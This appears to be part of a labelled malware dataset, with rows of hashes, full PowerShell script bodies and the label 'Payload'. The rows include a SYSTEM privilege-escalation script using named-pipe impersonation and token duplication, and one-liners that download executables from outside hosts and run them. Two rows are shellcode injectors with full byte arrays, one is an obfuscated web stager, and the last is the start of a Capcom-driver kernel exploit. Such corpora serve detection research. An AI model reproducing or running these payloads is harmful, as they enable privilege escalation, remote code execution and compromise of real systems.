                    Write-Verbose ""Starting the service""
                    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)
                    $err = $GetLastError.Invoke()

                    
                    if ($val -ne 0){
                        Write-Verbose ""Service successfully started""
                        
                        Start-Sleep -s 1
                    }
                    else{
                        if ($err -eq 1053){
                            Write-Verbose ""Command didn't respond to start""
                        }
                        else{
                            Write-Warning ""StartService failed, LastError: $err""
                        }
                        
                        Start-Sleep -s 1
                    }

                    
                    
                    Write-Verbose ""Deleting the service '$ServiceName'""
                    $val = $DeleteService.invoke($ServiceHandle)
                    $err = $GetLastError.Invoke()

                    if ($val -eq 0){
                        Write-Warning ""DeleteService failed, LastError: $err""
                    }
                    else{
                        Write-Verbose ""Service successfully deleted""
                    }
                
                    
                    Write-Verbose ""Closing the service handle""
                    $val = $CloseServiceHandle.Invoke($ServiceHandle)
                    Write-Verbose ""Service handle closed off""
                }
                else {
                    Write-Warning ""[!] OpenServiceA failed, LastError: $err""
                }
            }

            else {
                Write-Warning ""[!] CreateService failed, LastError: $err""
            }

            
            Write-Verbose ""Closing the manager handle""
            $Null = $CloseServiceHandle.Invoke($ManagerHandle)
        }
        else {
            
            Write-Warning ""[!] OpenSCManager failed, LastError: $err""
        }

        if($Success) {
            Write-Verbose ""Waiting for pipe connection""
            $Pipe.WaitForConnection()

            $Null = (New-Object System.IO.StreamReader($Pipe)).ReadToEnd()

            $Out = $ImpersonateNamedPipeClient.Invoke([Int]$PipeHandle)
            Write-Verbose ""ImpersonateNamedPipeClient: $Out""
        }

        
        $Pipe.Dispose()
    }

    
    
    
    Function Local:Get-SystemToken {
        [CmdletBinding()] param()

        $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')
        $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

        $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])
        $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null
        $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null
        $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()

        $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])
        $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LuidStruct = $LuidTypeBuilder.CreateType()

        $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])
        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null
        $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()

        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])
        $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')
        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))
        $PrivilegesField.SetCustomAttribute($AttribBuilder)
        $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()

        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'advapi32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            'kernel32.dll',
            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),
            @([Bool] $True)
        )

        $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])
        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcess',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'CloseHandle',
            'kernel32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder2)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'DuplicateToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'SetThreadToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'OpenProcessToken',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'LookupPrivilegeValue',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([String], [String], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)

        $Win32TypeBuilder.DefinePInvokeMethod(
            'AdjustTokenPrivileges',
            'advapi32.dll',
            [Reflection.MethodAttributes] 'Public, Static',
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            'Auto').SetCustomAttribute($AttribBuilder)
        
        $Win32Methods = $Win32TypeBuilder.CreateType()

        $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
        $GetCurrentProcess = $Win32Native.GetMethod(
            'GetCurrentProcess',
            [Reflection.BindingFlags] 'NonPublic, Static'
        )
            
        $SE_PRIVILEGE_ENABLED = 0x00000002
        $STANDARD_RIGHTS_REQUIRED = 0x000F0000
        $STANDARD_RIGHTS_READ = 0x00020000
        $TOKEN_ASSIGN_PRIMARY = 0x00000001
        $TOKEN_DUPLICATE = 0x00000002
        $TOKEN_IMPERSONATE = 0x00000004
        $TOKEN_QUERY = 0x00000008
        $TOKEN_QUERY_SOURCE = 0x00000010
        $TOKEN_ADJUST_PRIVILEGES = 0x00000020
        $TOKEN_ADJUST_GROUPS = 0x00000040
        $TOKEN_ADJUST_DEFAULT = 0x00000080
        $TOKEN_ADJUST_SESSIONID = 0x00000100
        $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY
        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor
            $TOKEN_ASSIGN_PRIMARY -bor
            $TOKEN_DUPLICATE -bor
            $TOKEN_IMPERSONATE -bor
            $TOKEN_QUERY -bor
            $TOKEN_QUERY_SOURCE -bor
            $TOKEN_ADJUST_PRIVILEGES -bor
            $TOKEN_ADJUST_GROUPS -bor
            $TOKEN_ADJUST_DEFAULT -bor
            $TOKEN_ADJUST_SESSIONID

        [long]$Luid = 0

        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)
        $tokPriv1Luid.Count = 1
        $tokPriv1Luid.Luid = $Luid
        $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED

        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, ""SeDebugPrivilege"", [ref]$tokPriv1Luid.Luid)

        $htoken = [IntPtr]::Zero
        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)

        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)
        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

        if(-not($RetVal)) {
            Write-Error ""AdjustTokenPrivileges failed, RetVal : $RetVal"" -ErrorAction Stop
        }
        
        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value

        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
            try {
                $OwnerInfo = $_.GetOwner()
                if ($OwnerInfo.Domain -and $OwnerInfo.User) {
                    $OwnerString = ""$($OwnerInfo.Domain)\\$($OwnerInfo.User)"".ToUpper()

                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {
                        $Process = Get-Process -Id $_.ProcessId

                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)
                        if ($Handle) {
                            $Handle
                        }
                    }
                }
            }
            catch {}
        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1
        
        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
            Write-Error 'Unable to obtain a handle to a system process.'
        } 
        else {
            [IntPtr]$SystemToken = [IntPtr]::Zero
            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose ""OpenProcessToken result: $RetVal""
            Write-Verbose ""OpenProcessToken result: $LastError""

            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero
            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose ""DuplicateToken result: $LastError""

            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(-not($RetVal)) {
                Write-Error ""SetThreadToken failed, RetVal : $RetVal"" -ErrorAction Stop
            }

            Write-Verbose ""SetThreadToken result: $LastError""
            $null = $Win32Methods::CloseHandle($Handle)
        }
    }

    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
        Write-Error ""Script must be run in STA mode, relaunch powershell.exe with -STA flag"" -ErrorAction Stop
    }

    if($PSBoundParameters['WhoAmI']) {
        Write-Output ""$([Environment]::UserDomainName)\\$([Environment]::UserName)""
        return
    }

    elseif($PSBoundParameters['RevToSelf']) {
        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
        $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

        $RetVal = $RevertToSelf.Invoke()
        if($RetVal) {
            Write-Output ""RevertToSelf successful.""
        }
        else {
            Write-Warning ""RevertToSelf failed.""
        }
        Write-Output ""Running as: $([Environment]::UserDomainName)\\$([Environment]::UserName)""
    }

    else {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
            Write-Error ""Script must be run as administrator"" -ErrorAction Stop
        }

        if($Technique -eq 'NamedPipe') {
            
            Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName
        }
        else {
            
            Get-SystemToken
        }
        Write-Output ""Running as: $([Environment]::UserDomainName)\\$([Environment]::UserName)""
    }
}
",Payload
27cce3d4991e4cd0a54bc4ecb970a4b5fac36b87a67fc64d79cc8259b9a10dfd,"
(New-Object System.Net.WebClient).DownloadFile('http://www.wvhmedicine.ru/1/P2.exe','fleeble.exe');Start-Process 'fleeble.exe'

",Payload
820fb4dfcda98e81a46fd94b2cd0c1d836b21f3a6049496da2e2d2b36fbc43e0,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/tpaesb.exe',""$env:TEMP\\Payment.exe"");Start-Process (""$env:TEMP\\Payment.exe"")

",Payload
b109cd54595d0c9e01754cdccf1600fe45e096f2fd211e223b82801e699f7190,"
$Hg41Eh = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Hg41Eh -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b,0xff,0xc3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x49,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,0x9b,0x16,0xa5,0xc2,0xd7,0xb7,0xad,0x37,0xaf,0xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x99,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0xb9,0x1a,0xaf,0x8c,0xdd,0x9d,0x7c,0xa7,0xd9,0x16,0x83,0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0xee,0x2f,0xf8,0x57,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0,0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a,0x1f,0xd5,0xcc,0xd5,0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x8f,0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,0xce,0x38,0xfa,0x0c,0xdb,0x2c,0x57,0x99,0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x12,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RqT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RqT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RqT,0,0,0);for (;;){Start-sleep 60};

",Payload
2b3e9686044910507a93a7e7a2ac100bcac9d76960ae34e3bcacc3374775d1d4,"
$SsUQ = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $SsUQ -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x3d,0x35,0x8e,0x8e,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0x32,0xd7,0x7b,0x72,0xa4,0x95,0x84,0x8b,0x34,0xfa,0x0d,0x6e,0x05,0x3a,0x69,0xfa,0x35,0x8a,0xf9,0xae,0xb9,0x61,0xaf,0x5a,0x4a,0x07,0x78,0x6c,0xfb,0xa2,0x5e,0x43,0xfc,0x9f,0xa3,0xc2,0x7e,0xe2,0xf7,0x24,0xbf,0x2d,0x0a,0x24,0xf8,0x50,0xe7,0x74,0x51,0x1e,0x5a,0x69,0xd6,0x6a,0x67,0x02,0xa4,0x7b,0xef,0xf7,0x7c,0x7d,0xde,0xa9,0xf7,0x24,0xc0,0x48,0xd4,0x5c,0x49,0x53,0x39,0x58,0x03,0xe8,0x89,0x16,0x92,0x38,0xc0,0xd7,0x39,0x05,0xed,0x25,0x43,0x41,0xc9,0xd5,0x36,0xbb,0x2a,0x6b,0x41,0x78,0x51,0xb7,0xc4,0x9b,0xf1,0x3c,0x7e,0x40,0x00,0x90,0x19,0x03,0x0e,0x5d,0x6d,0x4b,0x12,0x60,0xa2,0xe7,0x2e,0xe9,0x45,0x28,0xa7,0xa9,0x61,0xec,0xec,0x6a,0x0b,0xb5,0x48,0xdc,0x34,0xa5,0x33,0x81,0x90,0xad,0xd9,0xd6,0xa8,0xef,0xb5,0x1b,0x81,0x0f,0x45,0x34,0x92,0x7c,0x77,0x9b,0x08,0xeb,0x3b,0x54,0x97,0xec,0x3c,0x4f,0x6f,0x62,0xc3,0x70,0x90,0xaa,0x07,0x24,0xc0,0xc4,0xae,0x45,0x8b,0x14,0x4f,0x90,0x1c,0x45,0xff,0x4b,0xdd,0x35,0xbf,0x3b,0xb5,0x5f,0x30,0x63,0xa5,0x5f,0x9b,0x0c,0x4c,0xa5,0x4b,0x1d,0xaf,0x2b,0x3a,0x09,0xcd,0x33,0x3d,0x76,0x58,0xd5,0x57,0x96,0x0d,0x4d,0xcf,0x0f,0x14,0x05,0x6e,0xcf,0x82,0x63,0xb0,0x5b,0x21,0x93,0x7e,0xac,0x4c,0x87,0x16,0x5c,0x1b,0xf5,0xb0,0x63,0xb1,0x90,0x3c,0xf6,0x3e,0x33,0x6b,0x6e,0x3d,0x62,0x5b,0x31,0xbe,0x41,0xd0,0xf8,0x2a,0x2a,0x8e,0x04,0xbb,0xaa,0x4e,0x53,0xd1,0xaa,0x26,0x03,0x81,0xf8,0x53,0x4c,0x1c,0x6d,0xc8,0xd9,0x9f,0xc4,0xbd,0x4a,0xc8,0xea,0x98,0xbd,0x57,0x14,0xcf,0x3f,0xab,0xc3,0x29,0x4a,0xc5,0xd7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CoK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CoK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CoK,0,0,0);for (;;){Start-sleep 60};

",Payload
a86c463db9be241b874bffbe1511eac01d73a7e91ead0eb9414fe741fbf1c90a,"
[SYStEm.NEt.ServICePoINTMAnAger]::EXpeCT100CoNtINUE = 0;$wc=NEW-ObJecT SySTem.NeT.WeBCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDers.Add('User-Agent',$u);$wC.PROXy = [SYsteM.NeT.WeBREquEst]::DeFaULTWEBProxy;$wc.PROxY.CReDeNtIAlS = [System.NeT.CrEDEnTIaLCache]::DEfAuLTNETWOrkCrEDeNtiALs;$K='!(I._^m&}7uvTr>e~Ed|`kc$aFR

",Payload
0a8f30b95613fcfddd89fa3c81afe2fb5d9031ee2f6f59f6ff472b2b576e12d2,"function CapCom-GDI-x64Universal {

	Add-Type -TypeDefinition @""
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class CapCom
	{
		[DllImport(""kernel32.dll"", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFile(
			String lpFileName,
			UInt32 dwDesiredAccess,
			UInt32 dwShareMode,
			IntPtr lpSecurityAttributes,
			UInt32 dwCreationDisposition,
			UInt32 dwFlagsAndAttributes,
			IntPtr hTemplateFile);
		[DllImport(""Kernel32.dll"", SetLastError = true)]
		public static extern bool DeviceIoControl(
			IntPtr hDevice,
			int IoControlCode,
			byte[] InBuffer,
			int nInBufferSize,
			ref IntPtr OutBuffer,
			int nOutBufferSize,
			ref int pBytesReturned,
			IntPtr Overlapped);
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport(""gdi32.dll"")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport(""gdi32.dll"")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		}
""@

	
	function Get-LoadedModules {
	
	
		Add-Type -TypeDefinition @""
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
			public UIntPtr[] Reserved;
			public IntPtr ImageBase;
			public UInt32 ImageSize;
			public UInt32 Flags;
			public UInt16 LoadOrderIndex;
			public UInt16 InitOrderIndex;
			public UInt16 LoadCount;
			public UInt16 ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			internal Char[] _ImageName;
			public String ImageName {
				get {
					return new String(_ImageName).Split(new Char[] {'\\0'}, 2)[0];
				}
			}
		}
		public static class LoadedModules
		{
			[DllImport(""ntdll.dll"")]
			public static extern int NtQuerySystemInformation(
				int SystemInformationClass,
				IntPtr SystemInformation,
				int SystemInformationLength,
				ref int ReturnLength);
		}
""@
	
		[int]$BuffPtr_Size = 0
		while ($true) {
			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
			$SystemInformationLength = New-Object Int
		
			
			$CallResult = [LoadedModules]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
			
			
			if ($CallResult -eq 0xC0000004) {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
			}
			
			elseif ($CallResult -eq 0x00000000) {
				break
			}
			
			else {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				return
			}
		}
	
		$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
		$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
		if ([System.IntPtr]::Size -eq 4) {
			$SYSTEM_MODULE_INFORMATION_Size = 284
		} else {
			$SYSTEM_MODULE_INFORMATION_Size = 296
		}
	
		$BuffOffset = $BuffPtr.ToInt64()
		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
		$BuffOffset = $BuffOffset + [System.IntPtr]::Size
	
		$SystemModuleArray = @()
		for ($i=0; $i -lt $HandleCount; $i++){
			$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
			$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
			
			$HashTable = @{
				ImageName = $Cast.ImageName
				ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
				ImageSize = ""0x$('{0:X}' -f $Cast.ImageSize)""
			}
			
			$Object = New-Object PSObject -Property $HashTable
			$SystemModuleArray += $Object
		
			$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
		}
	
		$SystemModuleArray
	
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
	}
	
	function Stage-gSharedInfoBitmap {
	
	
		Add-Type -TypeDefinition @""
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		public static class gSharedInfoBitmap
		{
			[DllImport(""gdi32.dll"")]
			public static extern IntPtr CreateBitmap(
				int nWidth,
				int nHeight,
				uint cPlanes,
				uint cBitsPerPel,
				IntPtr lpvBits);
			[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			
			[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);
			[DllImport(""user32.dll"")]
			public static extern IntPtr CreateAcceleratorTable(
				IntPtr lpaccl,
				int cEntries);
			[DllImport(""user32.dll"")]
			public static extern bool DestroyAcceleratorTable(
				IntPtr hAccel);
		}
""@
	
		
		if ([System.IntPtr]::Size -eq 4) {
			$x32 = 1
		}
	
		function Create-AcceleratorTable {
			[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
			$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) 
			$User32Hanle = [gSharedInfoBitmap]::LoadLibrary(""user32.dll"")
			$gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, ""gSharedInfo"")
			if ($x32){
				$gSharedInfo = $gSharedInfo.ToInt32()
			} else {
				$gSharedInfo = $gSharedInfo.ToInt64()
			}
			$aheList = $gSharedInfo + [System.IntPtr]::Size
			if ($x32){
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
			} else {
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
			}
	
			$Result = @()
			$HashTable = @{
				Handle = $AccelHandle
				KernelObj = $phead
			}
			$Object = New-Object PSObject -Property $HashTable
			$Result += $Object
			$Result
		}
	
		function Destroy-AcceleratorTable {
			param ($Hanlde)
			$CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
		}
	
		$KernelArray = @()
		for ($i=0;$i -lt 20;$i++) {
			$KernelArray += Create-AcceleratorTable
			if ($KernelArray.Length -gt 1) {
				if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
					Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
					[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
